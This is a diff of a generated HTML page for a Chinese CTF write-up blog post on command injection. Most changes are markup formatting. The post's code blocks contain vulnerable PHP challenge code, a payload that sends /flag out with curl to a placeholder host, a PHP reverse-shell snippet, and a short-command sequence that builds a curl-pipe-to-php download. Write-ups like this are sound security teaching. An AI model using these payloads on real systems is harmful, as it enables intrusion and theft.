@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-cn">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
 
 
@@ -20,8 +20,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
 
@@ -40,7 +40,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -48,9 +48,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="wp,命令注入,">
+  <meta name="keywords" content="wp,命令注入," />
 
 
 
@@ -79,19 +79,20 @@
 
 
 
-<meta name="description" content="前言最近做了一些题目涉及了不少命令注入相关的技巧，这里来总结下。 基本概念对命令注入的理解实际上这方面和sql注入的成因还是有点类似的，主要是由于命令部分与数据部分没有很好地做区分，从而导致攻击者可以通过植入精心构造的payloay来达到自己的目的。例如读敏感信息，获取反弹shell等等。 一些基础知识 linux命令执行中常见的分隔符 &amp;amp;:  cmd1&amp;amp;cmd2&amp;amp;cmd3">
-<meta name="keywords" content="wp,命令注入">
+<meta name="description" content="前言最近做了一些题目涉及了不少命令注入相关的技巧，这里来总结下。 基本概念对命令注入的理解实际上这方面和sql注入的成因还是有点类似的，主要是由于命令部分与数据部分没有很好地做区分，从而导致攻击者可以通过植入精心构造的payloay来达到自己的目的。例如读敏感信息，获取反弹shell等等。 一些基础知识 linux命令执行中常见的分隔符 &amp;:  cmd1&amp;cmd2&amp;cmd3">
 <meta property="og:type" content="article">
 <meta property="og:title" content="命令注入初步">
-<meta property="og:url" content="http://www.star123.top/2019/11/14/命令注入初步/index.html">
+<meta property="og:url" content="http://www.star123.top/2019/11/14/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/index.html">
 <meta property="og:site_name" content="star&#39;s blog">
-<meta property="og:description" content="前言最近做了一些题目涉及了不少命令注入相关的技巧，这里来总结下。 基本概念对命令注入的理解实际上这方面和sql注入的成因还是有点类似的，主要是由于命令部分与数据部分没有很好地做区分，从而导致攻击者可以通过植入精心构造的payloay来达到自己的目的。例如读敏感信息，获取反弹shell等等。 一些基础知识 linux命令执行中常见的分隔符 &amp;amp;:  cmd1&amp;amp;cmd2&amp;amp;cmd3">
-<meta property="og:locale" content="zh-cn">
+<meta property="og:description" content="前言最近做了一些题目涉及了不少命令注入相关的技巧，这里来总结下。 基本概念对命令注入的理解实际上这方面和sql注入的成因还是有点类似的，主要是由于命令部分与数据部分没有很好地做区分，从而导致攻击者可以通过植入精心构造的payloay来达到自己的目的。例如读敏感信息，获取反弹shell等等。 一些基础知识 linux命令执行中常见的分隔符 &amp;:  cmd1&amp;cmd2&amp;cmd3">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://i.loli.net/2019/11/04/FZ2lDJnx8hOTjfp.png">
-<meta property="og:updated_time" content="2019-11-14T16:28:53.919Z">
+<meta property="article:published_time" content="2019-11-14T15:23:09.000Z">
+<meta property="article:modified_time" content="2019-11-14T16:28:53.919Z">
+<meta property="article:author" content="star">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="命令注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="命令注入初步">
-<meta name="twitter:description" content="前言最近做了一些题目涉及了不少命令注入相关的技巧，这里来总结下。 基本概念对命令注入的理解实际上这方面和sql注入的成因还是有点类似的，主要是由于命令部分与数据部分没有很好地做区分，从而导致攻击者可以通过植入精心构造的payloay来达到自己的目的。例如读敏感信息，获取反弹shell等等。 一些基础知识 linux命令执行中常见的分隔符 &amp;amp;:  cmd1&amp;amp;cmd2&amp;amp;cmd3">
 <meta name="twitter:image" content="https://i.loli.net/2019/11/04/FZ2lDJnx8hOTjfp.png">
 
 
@@ -122,7 +123,7 @@
 
 
 
-  <link rel="canonical" href="http://www.star123.top/2019/11/14/命令注入初步/">
+  <link rel="canonical" href="http://www.star123.top/2019/11/14/命令注入初步/"/>
 
 
 
@@ -138,7 +139,7 @@
 
 
 
-</head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
 
@@ -156,7 +157,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
+      <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">star's blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -184,9 +185,9 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
+          <a href="/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
             Home
           </a>
@@ -194,9 +195,9 @@
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
+          <a href="/archives/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
             Archives
           </a>
@@ -235,11 +236,11 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2019/11/14/命令注入初步/">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2019/11/14/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="star">
-      <meta itemprop="description" content>
+      <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
@@ -322,11 +323,11 @@
 <li>${xxx} 内容替换，Linux下有些常见的替换比如，${IFS}空字符或tab或换行等。</li>
 <li>$()和``等价，执行括号中的命令</li>
 </ol>
-<h2 id="几道题目"><a href="#几道题目" class="headerlink" title="几道题目"></a>几道题目</h2><h3 id="code-audit-challenge-6"><a href="#code-audit-challenge-6" class="headerlink" title="code_audit_challenge 6"></a>code_audit_challenge 6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_REQUEST[&apos;ip&apos;])) &#123;</span><br><span class="line">    $target = trim($_REQUEST[&apos;ip&apos;]);</span><br><span class="line">    $substitutions = array(</span><br><span class="line">        &apos;&amp;&apos;  =&gt; &apos;&apos;,</span><br><span class="line">        &apos;;&apos;  =&gt; &apos;&apos;,</span><br><span class="line">        &apos;|&apos; =&gt; &apos;&apos;,</span><br><span class="line">        &apos;-&apos;  =&gt; &apos;&apos;,</span><br><span class="line">        &apos;$&apos;  =&gt; &apos;&apos;,</span><br><span class="line">        &apos;(&apos;  =&gt; &apos;&apos;,</span><br><span class="line">        &apos;)&apos;  =&gt; &apos;&apos;,</span><br><span class="line">        &apos;`&apos;  =&gt; &apos;&apos;,</span><br><span class="line">        &apos;||&apos; =&gt; &apos;&apos;,</span><br><span class="line">    );</span><br><span class="line">    $target = str_replace(array_keys($substitutions), $substitutions, $target);</span><br><span class="line">    $cmd = shell_exec(&apos;ping  -c 4 &apos; . $target);</span><br><span class="line">    echo $target;</span><br><span class="line">    echo  &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
+<h2 id="几道题目"><a href="#几道题目" class="headerlink" title="几道题目"></a>几道题目</h2><h3 id="code-audit-challenge-6"><a href="#code-audit-challenge-6" class="headerlink" title="code_audit_challenge 6"></a>code_audit_challenge 6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_REQUEST[&#39;ip&#39;])) &#123;</span><br><span class="line">    $target &#x3D; trim($_REQUEST[&#39;ip&#39;]);</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;|&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line">    $target &#x3D; str_replace(array_keys($substitutions), $substitutions, $target);</span><br><span class="line">    $cmd &#x3D; shell_exec(&#39;ping  -c 4 &#39; . $target);</span><br><span class="line">    echo $target;</span><br><span class="line">    echo  &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
 
 <p>按照刚刚的思路，%0a换行执行第二行命令，这道题直接读取cat flag.php即可</p>
 <h3 id="垃圾网站检测器"><a href="#垃圾网站检测器" class="headerlink" title="垃圾网站检测器"></a>垃圾网站检测器</h3><p>这道题是典型的无回显命令注入，需要用到有外网ip的设备</p>
-<p>预测后台语句应该是这样的形式 system(“ping $_GET[‘url’]”)，只要将前面的语句闭合然后就可以顺利的写入后面的语句<br>payload: <a href="http://seclabs.cn:8009/?url=127.0.0.1;cat%20/flag|curl%20http://xxx%20-d%20@-" target="_blank" rel="noopener">http://seclabs.cn:8009/?url=127.0.0.1;cat%20/flag|curl%20http://xxx%20-d%20@-</a><br>建议用自己的vps nc</p>
+<p>预测后台语句应该是这样的形式 system(“ping $_GET[‘url’]”)，只要将前面的语句闭合然后就可以顺利的写入后面的语句<br>payload: <a href="http://seclabs.cn:8009/?url=127.0.0.1;cat%20/flag%7Ccurl%20http://xxx%20-d%20@-" target="_blank" rel="noopener">http://seclabs.cn:8009/?url=127.0.0.1;cat%20/flag|curl%20http://xxx%20-d%20@-</a><br>建议用自己的vps nc</p>
 <h3 id="bypass-正则waf"><a href="#bypass-正则waf" class="headerlink" title="bypass 正则waf"></a>bypass 正则waf</h3><ol>
 <li><p>正确得书写正则表达式\|\n</p>
 </li>
@@ -345,7 +346,7 @@
 <li><p>grep -r . .（递归搜索所有该目录下的文件）或者ls -a搜索flag即可</p>
 </li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://183.129.189.60:10026/?a=\&amp;b= 1%0a/b?n/l[r-t] -a /var/[v-x][v-x][v-x]/html/.F1jh_ / \</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;183.129.189.60:10026&#x2F;?a&#x3D;\&amp;b&#x3D; 1%0a&#x2F;b?n&#x2F;l[r-t] -a &#x2F;var&#x2F;[v-x][v-x][v-x]&#x2F;html&#x2F;.F1jh_ &#x2F; \</span><br></pre></td></tr></table></figure>
 
 <p>发现flag文件h3R3_1S_your_F1A9.txt,访问即可得到flag</p>
 <h3 id="code-challenge-60（hitcon-ctf-2017）"><a href="#code-challenge-60（hitcon-ctf-2017）" class="headerlink" title="code challenge 60（hitcon ctf 2017）"></a>code challenge 60（hitcon ctf 2017）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/root/Desktop/code_challenge/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line">   @mkdir($sandbox);</span><br><span class="line">   @chdir($sandbox);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">       @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">       @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">   &#125;</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
@@ -361,13 +362,11 @@
 </ol>
 <p>####ls -th命令模块</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;sl</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;dir</span><br><span class="line"> *&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line">sh x</span><br></pre></td></tr></table></figure>
-
 <p>php反弹脚本</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sock=fsockopen(<span class="string">"xxx"</span>,<span class="number">1234</span>);</span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br></pre></td></tr></table></figure>
 
 <p>getshell全过程</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt;ht-</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;dir</span><br><span class="line"> *&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line">sh x</span><br><span class="line"></span><br><span class="line">&gt;\;</span><br><span class="line">&gt;hp\</span><br><span class="line">&gt;p\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;op\</span><br><span class="line">&gt;t\</span><br><span class="line">&gt;3.\</span><br><span class="line">&gt;12\</span><br><span class="line">&gt;ar\</span><br><span class="line">&gt;st\</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line">sh x</span><br><span class="line">sh g</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://i.loli.net/2019/11/04/FZ2lDJnx8hOTjfp.png" alt="image.png"></p>
 
       
@@ -388,7 +387,7 @@
           
             <a href="/tags/wp/" rel="tag"># wp</a>
           
-            <a href="/tags/命令注入/" rel="tag"># 命令注入</a>
+            <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" rel="tag"># 命令注入</a>
           
         </div>
       
@@ -401,7 +400,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/11/03/近期比赛的wp/" rel="next" title="近期比赛的wp">
+              <a href="/2019/11/03/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B%E7%9A%84wp/" rel="next" title="近期比赛的wp">
                 <i class="fa fa-chevron-left"></i> 近期比赛的wp
               </a>
             
@@ -411,7 +410,7 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/11/17/论文复现1/" rel="prev" title="论文复现1">
+              <a href="/2019/11/17/%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B01/" rel="prev" title="论文复现1">
                 论文复现1 <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -488,9 +487,9 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives/">
+                <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -503,7 +502,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
